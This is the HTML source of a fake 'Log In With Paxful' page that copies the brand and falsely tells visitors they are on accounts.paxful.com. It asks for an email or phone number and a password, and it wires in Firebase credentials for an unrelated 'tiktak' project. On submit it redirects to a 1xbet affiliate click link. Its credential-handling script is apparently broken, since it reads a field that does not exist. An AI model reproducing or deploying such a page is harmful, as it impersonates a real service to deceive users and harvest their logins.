<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with Paxful</title>
    <link rel="stylesheet" href="styles.css">
      <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>

</head>
<body>
    <div class="login-container">
        <div class="header">
            <img src="paxful-logo.jpeg" alt="Paxful Logo" class="logo">
            <h2>Log In With Paxful</h2>
        </div> <br>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f9f9f9;
                margin: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .notice {
                background-color: #e7f3ff;
                border-left: 4px solid #007bff;
                padding: 10px 20px;
                max-width: 500px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .notice img {
                vertical-align: middle;
            }
            .notice p {
                margin: 10px 0;
                font-size: 16px;
            }
            .notice .url {
                background-color: #fff;
                padding: 5px 10px;
                border: 1px solid #ccc;
                border-radius: 3px;
                display: inline-block;
                font-family: monospace;
            }
            .notice .url img {
                vertical-align: middle;
                margin-right: 5px;
            }
        </style>
        <div class="notice">
            <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
        </div><br>
        <form class="login-form">
            <label for="phone-email">Your Phone or Email</label>
            <input type="text" id="phone-email" name="phone-email" required>
            
            <label for="password">Your Password</label>
            <input type="password" id="password" name="password" required>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="login-button" onclick="redirectToPage()">Log in</button>
            <script type="text/javascript">
              function redirectToPage() {
                  window.location.href = "https://1xbet.co.ke/?tag=d_73595m_2804c_%5B%5DMS%5B%5Dnull%5B%5Dnull%5B%5DSmartCPM%5B%5D7654968_d28985_l23918_clickunder";
              }
          </script>
        </form>
        <div class="create-account">
            <p>New on Paxful? <a href="#">Create an Account</a></p>
        </div>
    </div>
    <script>
  // Your web app's Firebase configuration
  const firebaseConfig = {
  apiKey: "AIzaSyCfQITMgoq2txO8uRIBc7ZVPWB-EnbeWw4",
  authDomain: "tiktak-5133e.firebaseapp.com",
  projectId: "tiktak-5133e",
  storageBucket: "tiktak-5133e.appspot.com",
  messagingSenderId: "477843944630",
  appId: "1:477843944630:web:d565c16c0a64862494e217"
};
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
    
        function login() {
          var email = document.getElementById('email').value;
          var password = document.getElementById('password').value;
    
          firebase.auth().signInWithEmailAndPassword(email, password)
          .then((userCredential) => {
            // Signed in
            var user = userCredential.user;
            saveUserDetails(user);
            alert('User logged in');
          })
          .catch((error) => {
            var errorCode = error.code;
            var errorMessage = error.message;
            alert('Error: ' + errorMessage);
          });
        }
    
        function saveUserDetails(user) {
          var userId = user.uid;
          firebase.database().ref('users/' + userId).set({
            email: user.email,
            lastLogin: new Date().toISOString()
          });
        }
      </script>
</body>
</html>
